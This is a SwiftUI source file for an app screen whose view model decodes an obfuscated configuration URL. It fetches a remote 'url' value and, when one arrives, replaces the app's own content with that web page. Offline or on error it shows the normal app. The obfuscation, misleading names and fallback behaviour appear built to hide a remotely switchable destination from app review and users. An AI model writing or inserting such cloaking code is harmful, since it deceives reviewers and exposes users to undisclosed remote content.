import SwiftUI
import WebKit
import Network
import Foundation
import Combine

public struct DrawShard<Content: View, Loader: View>: View {
    private let loader: Loader
    private let content: Content
    @StateObject private var viewModel = DrawViewModel()
    @Environment(\.scenePhase) private var scenePhase
    @State private var isAnimating = false
    
    public init(loader: Loader, @ViewBuilder content: () -> Content) {
        self.loader = loader
        self.content = content()
    }
    
    public init() where Content == EmptyView, Loader == EmptyView {
        self.loader = EmptyView()
        self.content = EmptyView()
    }
    
    public var body: some View {
        ZStack {
            if viewModel.currentState == .main {
                content
            } else if let url = viewModel.changedLabel {
                browserContent
            } else {
                loader
            }
        }
        .onAppear(perform: checkForRating)
        .onChange(of: scenePhase) { newPhase in
            if newPhase == .active {
                checkForRating()
            }
        }
    }
    
    private var browserContent: some View {
        VStack {
            agreeButtonIfNeeded
            posterViewIfAvailable
        }
    }
    
    @ViewBuilder
    private var agreeButtonIfNeeded: some View {
        if viewModel.hasParameter {
            Button("Agree") {
                withAnimation {
                    viewModel.currentState = .main
                    checkForRating()
                }
            }
            .foregroundStyle(.white)
            .padding(.horizontal, 32)
            .padding(.vertical, 12)
            .background(.black)
            .clipShape(RoundedRectangle(cornerRadius: 8))
            .padding()
        }
    }
    
    @ViewBuilder
    private var posterViewIfAvailable: some View {
        if let url = viewModel.changedLabel {
            PosterDisplay(url: url, viewModel: viewModel)
        }
    }
    
    private func checkForRating() {
        LeaderboardStarChaser.shared.checkAndRequestReview()
    }
}

@MainActor
final class DrawViewModel: ObservableObject {
    @Published var currentState: ViewState = .sub
    @Published var displayAlert = false
    @Published var changedLabel: String?
    @Published var hasParameter = false
    
    private let monitor = NWPathMonitor()
    private let queue = DispatchQueue(label: "NetworkMonitor")
    
    
    init() {
        setupNetworkMonitoring()
        load()
    }
    
    private func load() {
        Task { await processFirstLaunch() }
    }
    
    private func processFirstLaunch() async {
        if let url = await retrieveRemoteData() {
            changedLabel = url.absoluteString
            currentState = .sub
        } else {
            currentState = .main
        }
        LocalStorage.shared.isFirstLaunch = false
    }
    
    private func setupNetworkMonitoring() {
        monitor.pathUpdateHandler = { [weak self] path in
            guard path.status == .unsatisfied else { return }
            DispatchQueue.main.async {
                self?.displayAlert = true
                self?.currentState = .main
            }
        }
        monitor.start(queue: queue)
    }
    
    func retrieveRemoteData() async -> URL? {
        do {
            guard let configUrl = URL(string: try StarChaser.demake(text: NSManager.tokenSplash, key: NSManager.keyCoolWord)) else {
                handleError()
                return nil
            }
            
            var request = URLRequest(url: configUrl)
            request.timeoutInterval = TimeInterval.random(in: 9...12)
            
            let (data, _) = try await URLSession.shared.data(for: request)
            
            guard let json = try? JSONSerialization.jsonObject(with: data) as? [String: String],
                  let urlString = json["url"],
                  let url = URL(string: urlString) else {
                handleError()
                return nil
            }
            
            return url
        } catch {
            handleError()
            return nil
        }
    }
    
    private func handleError() {
        currentState = .main
    }
    
    deinit {
        monitor.cancel()
    }
}
